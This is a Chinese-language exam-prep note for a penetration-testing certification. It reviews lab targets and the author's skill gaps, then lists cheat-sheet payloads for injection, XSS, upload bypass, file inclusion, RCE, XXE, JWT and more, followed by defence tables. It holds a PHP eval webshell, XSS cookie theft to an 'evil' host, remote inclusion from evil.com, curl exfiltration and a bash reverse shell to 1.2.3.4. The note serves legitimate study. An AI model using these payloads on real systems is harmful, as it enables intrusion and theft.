# 2026-09-16 CCP 考前复习总纲（三道实操题 + 闭卷必背 + 工具操作 + 防护）

> 状态：🧪 考前复习（**每一栏都要亲手过一遍**，尤其「未实操」那一节）
> 用途：考试**不让查资料** → 这份笔记的目标是「**闭卷能复述 + 闭眼能操作**」，不是知识科普
> 关联：[CCP备考-计划与考纲映射](./CCP备考-计划与考纲映射.md) · [PortSwigger-Lab-做题进度](./PortSwigger-Lab-做题进度.md) · 各漏洞详解笔记（正文里逐条链接）

---

## 一、先定性：三道实操题大概考什么

### 1.1 已经练过的「真题级」靶场（9/14-9/15）

| 时间 | 目标 | 技术栈 | 打法骨架 | 结果 |
|---|---|---|---|---|
| 9/14 | 云帆文件管理系统 `45.136.14.125:8857` | Spring Boot + 内嵌 Tomcat + Vue3 SPA | 前端 JS 里 Base64 解出**硬编码凭据** + 隐藏上传接口 → **未授权上传 .jsp** → Tomcat 编译 → root | ✅ 完整报告（[靶场练习/云帆文件管理系统-文件上传安全评估.md]） |
| 9/15 | 同一目标复现 | 同上 | 指纹（JSESSIONID→Tomcat→jsp）→ 找接口（`/api/internal/v2/fileUpload`）→ **哥斯拉生成 JSP 马** → 上传 → 连接 → 命令执行 | ✅ root |

### 1.2 从这两题反推，三道实操题要的三项能力（⚠️ 待机构确认，别当定论）

```
能力① 信息收集 + 接口挖掘（不查资料也要会）
   F12 → Network 看数据包 → 判断前端(Vue3 打包产物=带哈希文件名) / 后端(Spring Boot Whitelabel 报错) / 容器(Cookie: JSESSIONID=Tomcat)
   → 源码里搜 /api/ → 找到接口清单；打包产物里 atob() 解 Base64 拿凭据/隐藏接口

能力② 漏洞利用（产出「可执行」而不是「上传成功」）
   上传 .jsp/.php 落到 Web 根目录 + 后缀被解析引擎接管 = 代码执行
   （两个条件的乘积：存储路径在不在 Web 根 × 后缀在不在解析白名单）

能力③ 后渗透 + 交付
   哥斯拉/蚁剑 连接 Webshell → 命令执行 → 提权（本案容器内直接 root）→ 写报告（结论摘要/攻击链/发现分级/修复建议）
```

> ⚠️ **待确认（考前一天问机构或在群里确认）**：三道题是不是「① 文件上传 getshell ② SQL 注入 ③ XSS/越权/逻辑」这条经典分布？限时多久？要不要交报告？——把原话发我，我按真题范围重排下面第六节的优先级。

---

## 二、熟练度自评：哪些我还没实操过

> 依据 = 笔记 `> 状态：` 标记 + PortSwigger 进度表 + `Desktop/靶场练习/` 实战产出

### 2.1 🟢 已实操过（考到能直接上手）

| 考点 | 我做过什么 | 备注 / 残留缺口 |
|---|---|---|
| SQL 注入 | sqli-labs Less-1~25 + [sqlmap 全流程实操](./2026-09-03-sqlmap全流程实操.md) `--dbs/--tables/--dump` | `--os-shell` 因 `secure_file_priv` 失败过（已查明原因） |
| XSS | xss-labs 1~13 + [PortSwigger XSS 前七题](./2026-09-12-PortSwigger-XSS实战前七题.md) 7/30 | **「投递到受害者」那一环还要练熟**（exploit server / iframe+onload） |
| 越权 / 访问控制 | [PortSwigger Access Control 13/13](./2026-08-08-越权漏洞详解.md) | 无 |
| 认证缺陷 | PortSwigger 13/14（剩 EXPERT 2FA 爆破，需 Macro+Session handling） | Lab14 没做 |
| 文件上传 getshell | 云帆靶场（真实 Spring Boot，含哥斯拉连接） + Upload-labs Pass-01 | **Pass-02~21 的「绕过」没系统通练**（那题是零过滤，没有需要绕的防护） |
| 靶机渗透提权 | [DC-1](./2026-08-15-DC1靶机渗透实战.md)（Drupalgeddon2 + SUID）、[Kioptrix1](./2026-08-28(续2)-Kioptrix1靶机渗透实战.md)（Samba 溢出） | 提权手法偏「运气型」，不是体系型 |

### 2.2 🟡 半熟练（做过一部分，做题时容易卡中间）

| 考点 | 进度 | 缺口 |
|---|---|---|
| CSRF | 4/11 | 第 5 关起（token 绑 non-session cookie / Referer / 断链）；Lab 3 的对照实验还没补 |
| SSRF | 3/7 | 黑名单绕过、开放重定向绕过、Shellshock 盲打、白名单绕过 |
| XXE | 2/9 | **盲打三连（带外/报错外带）没做** |
| 文件上传「绕过」 | 理论齐（[解析漏洞](./2026-07-31-文件上传解析漏洞.md) / [WAF 绕过](./2026-08-02-文件上传WAF绕过与防御.md)） | MIME / 文件头 / 黑名单后缀 / 二次渲染 / `.htaccess` 一条都没亲手跑过 |
| 代码审计 | 全线 🧪 | 工具（Seay/semgrep/Xdebug/IDEA）装好了，没拿真源码完整挖一个洞 |
| WAF 绕过 | 纯理论 | 本地三层 WAF 环境还没搭 |

### 2.3 🧪 纯理论没实操（**考试若考 = 最危险**，按危险度排序）

| 优先级 | 考点 | 我的笔记 | 为什么危险 |
|---|---|---|---|
| 🔴 P0 | **文件包含 LFI/RFI/伪协议/日志投毒** | [08-05 文件包含](./2026-08-05-文件包含漏洞详解.md) | 常和上传/RCE 串成一条链考，我没在靶场里走过一次 |
| 🔴 P0 | **RCE 命令执行/代码执行** | [08-05 RCE](./2026-08-05-RCE远程代码命令执行详解.md) | 上传 getshell 之后的下半场，考「怎么接命令」 |
| 🔴 P0 | **任意文件读取/下载** | [08-07 文件下载](./2026-08-07-文件下载漏洞详解.md) | 一句话就能考（`?file=../../etc/passwd`），却最容易忘 payload |
| 🟠 P1 | PHP 反序列化 | [08-10 反序列化入门](./2026-08-10-PHP反序列化入门.md) | 魔术方法触发时机记不牢 |
| 🟠 P1 | JWT / Token | [08-12 JWT](./2026-08-12-JWT安全与攻击.md) / [08-10 Token](./2026-08-10-Token安全与防护绕过.md) | 三招（none/弱密钥/算法混淆）只在纸上 |
| 🟠 P1 | 支付篡改 / 业务逻辑 / 条件竞争 | [08-09 支付篡改](./2026-08-09-支付篡改与业务逻辑漏洞.md) | 靶场没做过 |
| 🟡 P2 | 找回/重置逻辑越权、验证码绕过 | [08-09 找回重置](./2026-08-09-找回与重置机制的逻辑越权.md) / [08-10 验证码](./2026-08-10-验证码安全与绕过技术.md) | 部分被 PortSwigger 认证 lab 覆盖到了 |
| 🟡 P2 | Windows/Linux 提权体系 | 提权系列 6 篇 | 除两关靶机外全是理论 |
| ⚪ P3 | 内网横向 / 应急响应 | 内网 8 篇 / 应急 4 篇 | 三道实操题是 Web 漏洞，**先不投入**，理论题认名词即可 |

---

## 三、闭卷必背 Payload 记忆卡

> 记法：**每个漏洞只背「判定 → 一条通路 → 一句防御」**，别背全清单。下面加粗的是必背。

### 3.1 SQL 注入（最有把握，保持手感）

| 场景 | Payload |
|---|---|
| 判定 | `'`（报错/异常）· `and 1=1` vs `and 1=2` |
| **字段数** | `order by N`（递增到报错，**N-1 = 字段数**） |
| **联合查询** | `-1' union select 1,2,...,M --+`（`-1` 让原查询为空才会显示回显位） |
| **当前库** | `-1' union select 1,database() --+` |
| **表名** | `-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+` |
| **列名** | `... group_concat(column_name) from information_schema.columns where table_name='users' --+` |
| **脱库** | `-1' union select 1,group_concat(username,0x3a,password) from users --+` |
| 报错注入 | `and updatexml(1,concat(0x7e,(select database()),0x7e),1)` / `extractvalue(1,concat(0x7e,...))` |
| 布尔盲注 | `and length(database())>5` · `and substr(database(),1,1)='s'` |
| 时间盲注 | `and sleep(5)` · `and if(substr(database(),1,1)='s',sleep(5),0)` |
| 注释符 | `--+`（**+ 是空格**，HTTP 里不能直接带空格）· `#` · `/* */` |
| 绕 WAF | 双写 `selselectect` · 大小写 `UnIoN` · 内联注释 `/*!50000union*/` · 空格→`/**/`或`%0a` · `and`→`&&` · `=`→`like` |

```bash
# sqlmap 六连（闭卷要能默出来）
sqlmap -u "http://x/a.php?id=1" --dbs
sqlmap -u "http://x/a.php?id=1" -D db --tables
sqlmap -u "http://x/a.php?id=1" -D db -T users --columns
sqlmap -u "http://x/a.php?id=1" -D db -T users --dump
sqlmap -u "http://x/a.php?id=1" --batch --level=3 --risk=2 --tamper=space2comment   # 绕 WAF
sqlmap -u "http://x/a.php?id=1" --os-shell                                          # 高权限+可写目录
sqlmap -r req.txt                                                                    # POST/带 Cookie/自带 Cookie 头
```
**坑**：`-1` 忘写 → 不显示；`--+` 写成 `--` → 报错；`group_concat` 有长度上限 → 截断了改 `limit 0,1` 逐行取。

### 3.2 XSS

| 场景 | Payload |
|---|---|
| **通用三兄弟** | `<script>alert(1)</script>` · `<img src=1 onerror=alert(1)>` · `<svg onload=alert(1)>` |
| **尖括号被 HTML 实体编码** | `" autofocus onfocus=alert(1)`（属性注入，**结尾不写引号**，借用页面原引号收尾） |
| `<script>` 被过滤 | `<img src=x onerror=alert(1)>` · `<details open ontoggle=alert(1)>` · `<body onpageshow=alert(1)>` |
| 零交互优先（最稳） | `autofocus+onfocus` · `style="animation:..." onanimationstart=alert(1)` |
| innerHTML sink | `<script>` 不执行 → 用**会自己报错的元素** `<img src=1 onerror=...>` |
| href sink | `javascript:alert(1)`（**不需要尖括号**，但需要一次点击） |
| DOM 型投递 | `<iframe src="https://target/#" onload="this.src+='<img src=1 onerror=print()>'">` |
| 绕关键字 | 大小写 `OnError` · 双写 `<scr<script>ipt>` · `onerror` 后加空格/换行 · HTML 实体 `&#x61;` |
| 偷 Cookie | `new Image().src='//evil/'+document.cookie`（**HttpOnly 则偷不到** → 改用 CSRF/读页面/BeEF） |

**一句话认知**：`alert(1)` 能弹 ≠ 漏洞可用 → 要问「**受害者怎么被带到我这个 payload 上**」（投递环）。

### 3.3 CSRF

**三条命门（必背）**：方法（所有改状态入口都要校验）· 存在性（参数缺失直接拒）· 归属（token 必须绑会话）。

```html
<!-- 最简 PoC（无防御题就用它） -->
<form action="http://target/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit()</script>
```
- Burp：抓请求 → 右键 **Engagement tools → Generate CSRF PoC** → 复制到 exploit server Body → Store → Deliver to victim
- 绕过变体：换 GET 提交 / 删掉 token 参数 / 用自己的合法 token（不绑会话）/ cookie 注入让 non-session cookie 可控
- **判定信号**：去 My account 页面看邮箱是否真的变了（**不看状态码**）

### 3.4 SSRF

| 目标 | Payload |
|---|---|
| 打本机 | `stockApi=http://localhost/admin` · `http://127.0.0.1/admin` |
| 打内网 | `http://192.168.0.1:8080/admin`（Intruder 扫末位八位组 1-255，200 那条就是） |
| **黑名单绕过（必背写法）** | `127.1` · 十进制 `2130706433` · 八进制 `0177.0.0.1` · 十六进制 `0x7f000001` · `[::1]` · `127.0.0.1.nip.io` · `%31%32%37.0.0.1` |
| 白名单绕过 | `http://white.com@127.0.0.1/` · 用白名单域上的**开放重定向**跳内网 |
| 其他协议 | `file:///etc/passwd` · `dict://127.0.0.1:6379/` · `gopher://`（打 Redis 等内网服务） |
| **盲打（OOB）** | 把 `Referer`/`UA`/`XFF`/`url` 参数的值换成 **Burp Collaborator 域** → Send → Collaborator **Poll now** → 出现 DNS+HTTP（Source IP = 靶场）= 命中 |

### 3.5 文件上传（⭐ 考过大题，等级最高）

**绕过阶梯（按顺序试）**：

```
1. 前端 JS 校验      → 关 JS / 抓包改包直接发
2. Content-Type      → 改成 image/png、image/jpeg
3. 文件头(magic)     → 前面加 GIF89a / 真实图片头 + 代码（图马、二次渲染）
4. 黑名单后缀漏网    → .php3 .php4 .php5 .phtml .pht .php7 .phps / 大小写 .Php / .php 后加空格或点 / shell.php::$DATA / shell.php%00.jpg / 双写 shell.pphphp
5. 白名单            → %00 截断（老版本）/ 解析漏洞 / .htaccess 自定义解析
6. 中间件解析漏洞    → Apache 多后缀 1.php.xxx · Nginx fix_pathinfo 1.jpg/x.php / CVE-2013-4547 空格点 · IIS6 1.asp;.jpg 与文件夹解析 1.asp/1.jpg · IIS7 FastCGI 1.jpg/.php
7. 条件竞争          → 先传后删/先传后改，趁删除前访问
```
```apache
# .htaccess 让 .jpg 当 PHP 执行（Apache + AllowOverride All 时）
AddType application/x-httpd-php .jpg
```
**Webshell 内容**：PHP `<?php @eval($_POST['x']);?>`；**JSP/ASP 一律用哥斯拉「生成」**，别手写。

**⭐ 判定「上传成功」≠「代码执行」**（云帆那题沉淀出来的最快的信号）：
```
静态资源被下载 → Content-Type: text/plain / application/octet-stream + Last-Modified
被 JSP 引擎编译 → Content-Type: text/html + Set-Cookie: JSESSIONID
```
**危害判定的乘积**：`存储路径在不在 Web 根目录` × `后缀在不在解析白名单`。

### 3.6 文件包含（🔴 没实操过，必须背）

| 场景 | Payload |
|---|---|
| **读文件** | `?file=../../../../etc/passwd` · `?file=/etc/passwd`（绝对路径） |
| **读源码（必背）** | `?file=php://filter/read=convert.base64-encode/resource=index.php` → 返回 Base64，自己解 |
| **执行代码** | `?file=data://text/plain,<?php system('id');?>`（需 `allow_url_include=On`） |
| 无文件执行 | `?file=php://input` + POST body 写 `<?php system('id');?>` |
| 远程包含 | `?file=http://evil.com/shell.txt` |
| **日志投毒** | UA 里写 `<?php system($_GET['c']);?>` → 包含 `/var/log/apache2/access.log`（Nginx 同理）/ `/var/log/nginx/access.log` |
| 其他包含点 | `/proc/self/environ` · session 文件 `/tmp/sess_xxx` · SSH 日志 |
| 绕过 | `..%2f` · 双写 `....//` · `…/./` · `?file=file:///etc/passwd` · 长度截断 |

**一句话**：LFI 没有 `php://filter` 就读不到 PHP 源码（会被当作 PHP 执行掉，回显空白）。

### 3.7 RCE（🔴 没实操过，必须背）

| 平台 | 拼接符 |
|---|---|
| Linux | `;` `\|` `\|\|` `&&` `&` `` `cmd` `` `$(cmd)` |
| Windows | `&` `&&` `\|\|` `\|` |

| 场景 | 做法 |
|---|---|
| 无回显 | 写文件到 Web 目录再访问 · `curl http://my-vps/?d=$(id\|base64)` 外带 · DNS 外带 · 盲时间 `sleep 5` |
| 关键字被过滤 | `whoami`→`who$@ami` / `c'a't /etc/passwd` / `/bin/cat` / `$IFS` 代替空格 / 通配符 `cat /etc/pass*` / base64 解码执行 |
| 反弹 shell | `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1` |
| 代码执行函数 | `eval()` `assert()` `system()` `exec()` `popen()` `create_function()` `preg_replace(/e)` |

### 3.8 XXE（🟡 前半会，盲打没做）

```xml
<!-- 读文件（最经典） -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- 读 PHP 源码（配 filter） -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>

<!-- 打内网探端口 -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://192.168.0.1:8080/">]>
```
- 无回显 = 外部 DTD（`SYSTEM "http://my-vps/evil.dtd"`）+ 参数实体 `%xxe;` 把内容带出去（或报错外带）
- 防御开关（理论题要答）：Java `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` / PHP `libxml_disable_entity_loader(true)`

### 3.9 PHP 反序列化（🟠 记触发时机）

**魔术方法触发时机表（必背）**：

| 方法 | 什么时候执行 |
|---|---|
| `__construct` | `new` 对象时 |
| `__destruct` | 对象被销毁（脚本结束）← 最常用入口 |
| `__wakeup` | `unserialize()` 被调用时 |
| `__toString` | 对象被当字符串用时 |
| `__get` / `__set` | 读/写不可访问属性 |
| `__call` | 调用不存在的方法 |
| `__invoke` | 对象被当函数调用时 |

- 流程：找 POP 链（从危险函数倒推 `__destruct`/`__wakeup`）→ 构造序列化字符串 → 塞进用户可控的 `unserialize()` 入口
- 细节：private 属性有 `%00类名%00属性`（URL 里 `%00` 要活着）；`__wakeup` 可用 CVE-2016-7124 绕（**属性数量写大于真实数量**）
- 我实操过 Java 侧：[WebGoat 反序列化 + 选链](./2026-08-11-Java反序列化实战-WebGoat与选链.md)（javap 看 handler → 编译匹配类）

### 3.10 JWT（🟠 三招要记）

- 结构：`base64Url(header).base64Url(payload).签名` → **拿到 JWT 先 base64 解开看 header/payload**
- 攻击：① `alg: none`（改 header 为 none + **删掉签名段但保留末尾的 `.`**）② 弱密钥爆破（hashcat `-m 16500 jwt.txt wordlist`）③ `RS256→HS256` 混淆（拿**公钥**当 HMAC 密钥重签）④ `kid` 注入（路径穿越/命令注入）
- 判定：改完 payload 还能 200 = 验签形同虚设

### 3.11 认证 / 逻辑类（🟡 有 PortSwigger 底子）

| 类型 | 必背要点 |
|---|---|
| 用户名枚举 | 看响应**文案/长度/状态码/时间差**；**防护机制本身就是信号**（锁定提示 = 账号存在） |
| 爆破绕过 | `X-Forwarded-For` 轮换 IP · **成功登录把失败计数清零**（错一次对一次交替）· 改密接口新密码填不一致则不锁 · JSON `password` 传**数组**（单请求多凭据）· 验证码复用/前端校验/答案在 URL |
| 越权四模式 | ① 闯空门（URL 直接访问）② 伪造身份（Cookie `admin=true`、JSON 加 `roleid=2`）③ 改资源 ID（IDOR）④ 绕校验（`X-Original-URL`、换 HTTP 方法、多步流程最后一步不校验、`Referer` 伪造、302 Body 泄露） |
| 支付 | 改金额/数量/负数/整数溢出 · 回调不验签 · **条件竞争**（并发重复用券） |
| 找回密码 | token 绑不绑用户 · 改 `username` 参数 · 多步状态机缺失 · 响应里直接回 token · 重置链接域名可控（`X-Forwarded-Host`） |

---

## 四、工具操作记忆卡（闭卷点得出来）

| 工具 | 必会操作 |
|---|---|
| **Burp** | Proxy（Intercept 开关 / HTTP history 右键 Send to Repeater·Intruder）· Repeater（Ctrl+R 改包重放）· Intruder（`§` 标位置；Sniper/Battering ram/Pitchfork/Cluster bomb；**Grep extract / Grep match** 标记命中；Payload processing: Hash→Add prefix→Base64）· Decoder（Base64/URL/HTML/Hex 一键）· Comparer（比对响应）· **右键 Engagement tools → Generate CSRF PoC** · Collaborator（Poll now 收带外）· **Macros + Session handling rules**（2FA 爆破题） |
| **sqlmap** | 见 3.1；另 `--file-read` `--file-write` `--os-cmd` `--tamper` `-r`（从文件读请求） |
| **哥斯拉（Godzilla）** | 生成（Generate：JSP/PHP + 密码 + 密钥）→ 保存马 → （抓包）上传 → 目标 → 添加（URL = `http://x/uploads/x.jsp` + 密码 + 密钥 + **有效载荷类型要选对**）→ 测试连接 = success → 右键进入 → 命令执行/文件管理/数据库 |
| **蚁剑（AntSword）** | 添加数据（URL + 连接密码 + 编码器 default）→ 测试连接 → 文件管理 / 虚拟终端 |
| **信息收集** | `nmap -sV -sC -p- ip` · `dirsearch -u http://x -e php,txt,zip` · `whatweb http://x` · `nmap --script=http-title,http-headers` |
| **hashcat** | `-m 0` MD5 · `100` SHA1 · `1000` NTLM · `1400` SHA256 · `3200` bcrypt · `16500` JWT；`-a 0 -w 3`；`-r rules/best64.rule` |
| **抓包拓展** | Burp CA 装到手机 + **Proxifier**（Windows 应用强制走代理）→ 抓 App/小程序 |
| **编码** | Base64 / URL 编码 / HTML 实体 / Hex / Unicode —— 全在 Burp Decoder 里一键，不用背表 |

---

## 五、防护必答表（理论题最爱：以下哪种做法正确）

| 漏洞 | ✅ 正确修复 | ❌ 常见错误示范（就是漏洞成因） |
|---|---|---|
| SQL 注入 | 参数化查询（预编译 PreparedStatement） | 前端校验 / `addslashes` 拼接 |
| XSS | **按上下文输出编码** + CSP + HttpOnly + 富文本白名单 | 只过滤 `<script>` / 只做输入过滤不做输出编码 |
| CSRF | token **绑会话** + **所有改状态方法**都校验 + 缺失即拒 + SameSite | token 存在 Cookie 里 / 只在 POST 分支校验 / 取不到就跳过 |
| SSRF | 协议白名单 + 禁内网段（127/10/172.16-31/192.168/169.254）+ 不跟随重定向 | 只做黑名单关键字（`127.0.0.1`） |
| 文件上传 | 后缀白名单（先转小写）+ **存到 Web 根之外** + 随机重命名 + magic bytes 探测 + 上传目录禁脚本解析 | 只查 Content-Type / 只做前端校验 / 只做黑名单 |
| 文件包含 | 不接收用户路径（用**白名单映射** id→文件）+ `allow_url_include=Off` | 只过滤 `../` |
| RCE | 不拼系统命令（用语言内 API）+ 必须拼时参数白名单/转义 | 过滤 `;` 一个符号 |
| XXE | 解析器**禁用外部实体**（disallow-doctype-decl） | 只过滤 `<!DOCTYPE` 关键字 |
| 反序列化 | 不接收不可信序列化数据 + 类白名单 + 数据签名 | 只判断数据长度/格式 |
| JWT | **服务端指定算法**（不接受 header 里的 alg）+ 强密钥 + 验签 + 过期校验 | 信任 header 的 `alg` |
| 越权 | **每个请求服务端校验数据属主**（不信任前端传的 id/role） | 只在页面/菜单上隐藏按钮 |
| 通用 | 统一异常处理（不回显堆栈/绝对路径）+ 日志审计 + 最小权限运行 | Whitelabel 报错页直接给用户看（云帆 F5） |

---

## 六、考前待实操清单（按优先级 + 时间盒）

> 原则：**🟢 的练手速，🧪 的练第一遍**。每项做完在本节打勾并注一句卡点。

### P0 — 今晚（约 2h）：把「一次都没做过」的补上

- [ ] **1. 文件包含 → RCE 串一遍**（40min）· DVWA 或 pikachu 的 File Inclusion / exec 模块
  - 目标：`php://filter` 读源码 → 包含日志 getshell → 串一句「上传+包含=RCE」的话术
- [ ] **2. 任意文件读取**（20min）· 找一个有 `?file=`/`?path=` 的靶场页（DVWA/pikachu 均可）
  - 目标：`../../../../../etc/passwd` 一次成功，记住 Linux/Windows 两个路径（`C:\Windows\win.ini`）
- [ ] **3. upload-labs Pass-02~12 通一遍**（60min）· 重点 Pass-02(MIME) / 03-07(黑名单后缀) / 11-12(文件头·二次渲染)
  - 目标：每个 Pass 能说出「它查了什么 → 我用哪一层绕过」

### P1 — 明天上午（约 1.5h）：把「真题动作」练成肌肉记忆

- [ ] **4. 云帆靶场盲操复现**（30min 限时）：F12 看技术栈 → 源码/JS 挖接口 → 上传 JSP → 哥斯拉连接 → 命令执行（**不看成稿**）
- [ ] **5. Burp 手速三连**（30min）：XSS 一关（exploit server 投递）+ CSRF 一关（Generate CSRF PoC）+ 越权一关（改 id）—— 用 PortSwigger 已过关卡，纯练手速
- [ ] **6. sqlmap 闭卷跑一遍**（20min）：不复看笔记，仅靠 3.1 的记忆跑 `--dbs → --tables → --dump`

### P2 — 有余力再做

- [ ] **7. PHP 反序列化**打一条链（CTF 小题/WebGoat 对应课）
- [ ] **8. JWT 三招**本地起个小 demo 或找在线靶场实际改一次 `alg:none`
- [ ] **9. 报告模板背诵**：按 [云帆报告] 的小标题顺序背下来（结论摘要 → 攻击链 → 发现分级表 → 防护有效性评估 → 修复建议 → 附录接口清单）——实操题大概率要交报告

### P3 — 明确不做（省时间）

- 内网横向 / 应急响应 / 代码审计深挖：三道实操题是 Web 漏洞，理论题认名词即可 → 见第七节的速记表

---

## 七、理论速记一页纸（笔试前 10 分钟看这张）

**状态码**：200 成功 · 301/302 重定向 · 400 请求错误 · 401 未认证 · 403 禁止 · 404 不存在 · 405 方法不允许 · 500 服务器错误 · 502/503 网关/服务不可用

**端口-服务-漏洞**：21 FTP(匿名/弱口令) · 22 SSH(爆破) · 23 Telnet · 25 SMTP · 53 DNS(域传送) · 80/443 Web · 110/143 邮件 · **445 SMB(永恒之蓝)** · **1433 MSSQL(xp_cmdshell)** · 1521 Oracle · **3306 MySQL(注入/UDF)** · **3389 RDP(爆破/BlueKeep)** · 5432 PostgreSQL · **6379 Redis(未授权)** · 27017 MongoDB(未授权) · 8080 Tomcat/中间件

**OSI 七层 ↔ TCP/IP 四层**：应用/表示/会话 → 应用层；传输层（TCP/UDP，**端口在这层**）；网络层（IP/ICMP，路由）；数据链路/物理 → 网络接口层

**HTTP 关键头**：`Cookie`（会话）· `Referer`（来源）· `UA`（客户端）· `Content-Type`（上传绕过）· `X-Forwarded-For`（IP 伪造）· `Host`/`X-Forwarded-Host`（重置投毒）· `X-Original-URL`（越权绕过）

**Cookie vs Session**：Cookie 存客户端，Session 存服务端；`Set-Cookie` 下发 SessionID；GET 参数在 URL，POST 在 Body

**OWASP Top 10 (2021)**：A01 访问控制失效 · A02 加密失败 · A03 注入 · A04 不安全设计 · A05 安全配置错误 · A06 脆弱过时组件 · A07 身份认证失败 · A08 软件与数据完整性失败 · A09 日志与监控失败 · A10 SSRF

**法规红线**：网络安全法 / 数据安全法 / 个人信息保护法 / **等保 2.0**；渗透测试必须有**书面授权**、明确范围与时间、不得访问超出授权范围的数据、（发现自己越界要立即停止并报告）

**大模型安全（培训新板块）**：提示词注入（直接/间接）· 幻觉（捏造事实）· 训练数据泄露（隐私/版权）· 供应链后门（恶意权重/插件）

**编码识别**：`%xx` = URL 编码；`&#x..;` = HTML 实体；`=` 结尾/长度 4 的倍数 = Base64；`\u4e2d` = Unicode；`25%` 套娃 = 二次编码

---

## 八、待确认 / 我的疑问

- ❓ 三道实操题的**具体形式**：靶场类型（单点漏洞？综合靶机？）、限时多久、要不要交报告、评分看重「拿到 flag/权限」还是「报告规范」
- ❓ 笔试题型：单选/多选/判断/简答？有没有官方题库/模拟题
- ❓ 已经做过的那套模拟题：**把题目发我**，我按「漏洞 / 工具 / 防护」三类做错题映射 → 反推考点分布，比现在这样全面铺开更省时间

## 待实践

- [ ] 第六节 P0/P1 清单逐项打勾
- [ ] 模拟题错题映射（等题目）
- [ ] 考完把「实际考了什么」补进本笔记，成为下一届的真题记录

## 关联笔记

- [CCP备考-计划与考纲映射](./CCP备考-计划与考纲映射.md)（主线文档）
- [PortSwigger-Lab-做题进度](./PortSwigger-Lab-做题进度.md)（🟢/🟡 的原始依据）
- 各漏洞详解：[SQL 注入入门](./2026-07-26-SQL注入入门.md) · [XSS 入门](./2026-08-02-XSS跨站脚本攻击入门.md) · [CSRF/SSRF](./2026-08-04-CSRF与SSRF漏洞详解.md) · [文件上传总览](./2026-07-31-文件上传漏洞.md) · [文件包含](./2026-08-05-文件包含漏洞详解.md) · [RCE](./2026-08-05-RCE远程代码命令执行详解.md) · [文件下载](./2026-08-07-文件下载漏洞详解.md) · [XXE](./2026-08-11-XXE与XML外部实体注入.md) · [反序列化](./2026-08-10-PHP反序列化入门.md) · [JWT](./2026-08-12-JWT安全与攻击.md) · [逻辑漏洞](./2026-08-09-支付篡改与业务逻辑漏洞.md)
- 实战产出（桌面）：`Desktop/靶场练习/云帆文件管理系统-文件上传安全评估.md`（真题风格报告）、`Desktop/文件管理系统靶场.md`（哥斯拉流程）

> ⚠️ 声明：以上技术仅用于**授权环境**（CCP 授权靶场 / 自己的靶机 / CTF）。考试环境属授权范围；对非授权目标使用属违法行为。
